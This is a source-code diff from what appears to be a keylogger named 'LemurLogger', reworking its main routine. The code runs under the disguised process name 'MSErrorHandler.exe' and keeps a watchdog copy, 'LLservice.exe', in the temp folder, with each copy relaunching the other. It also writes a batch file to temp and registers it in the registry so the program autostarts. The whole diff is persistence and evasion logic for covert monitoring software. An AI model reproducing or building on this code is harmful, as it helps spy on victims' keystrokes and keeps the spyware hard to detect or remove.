@@ -18,47 +18,45 @@ int main()
 {
     pre::start();
 
-    string filename = IO::getFileName();
-    if (filename == "MSErrorHandler.exe" &&  filename == "MSErrorHandler" ){
+    string filename_path = IO::getFileNameWithPath();
+    char* temp = getenv("temp");
+    std::string temp_dir(temp);
+    std::string pathtemp = IO::getLLservicePath();
+    std::string EEpath = IO::getEERORPath();
+
+    if (filename_path == EEpath){
         std::string msg = "sate idle";
         Helper::WriteAppLog(msg);
-        char* temp = getenv("temp");
-        std::string temp_dir(temp);
-        std::string path = temp_dir+"\\LLservice.exe";
-	    while(true){
-	    while(IO::exists_file(path)){
-            if (GetIsOnProcess(filename)){
-                ss::creckSoc();
-            } else {
-                IO::startup(path.c_str());
-            }
+        while(true){
+            while(IO::exists_file(pathtemp)){
+                if (GetIsOnProcess(filename_path)){
+                    //ss::creckSoc();
+                } else {
+                    IO::startup(pathtemp.c_str());
+                }
 
         }
-	IO::copy_File();
+	    IO::copy_File();
         }
     }else{
-    	if(filename == "LLservice.exe" &&  filename == "LLservice"){
+    	if(filename_path == pathtemp){
 		usleep(500000);
  		while (GetIsOnProcess("LemurLogger.exe")||GetIsOnProcess("LemurLogger")){
-                	std::string msg = "sate idle";
+                std::string msg = "sate idle";
         		Helper::WriteAppLog(msg);
-			IO::startup(path.c_str());
+			    //IO::startup(path.c_str());
             	}
-         }
+         } else{
+            std::string batname = "\\batLLog.bat";
+            char* temp = getenv("temp");
+            std::string temp_dir(temp);
+            std::string batpath = temp_dir+batname;
+            if(!IO::exists_file(batpath)){
+                IO::mkbat(IO::getFileNameWithPath(),batpath);
+                Registry::RegisterProgram2(batname,batpath);
+            }
+        }
     }
-    if(filename == "LemurLogger.exe"|| filename =="LemurLogger")
-	   {
-                    std::string batname = "\\batLLog.bat";
-		    char* temp = getenv("temp");
-		    std::string temp_dir(temp);
-                    std::string batpath = temp_dir+batname;
-	            if(!IO::exists_file(batpath)){
-		    IO::mkbat(IO::getFileNameWithPath(),batpath);
-                    Registry::RegisterProgram2(batname,batpath);
-            		}	
-    		}
-
-
     MSG Msg;
     IO::MkDir(IO::GetOurPath(true));
     GetProcID();
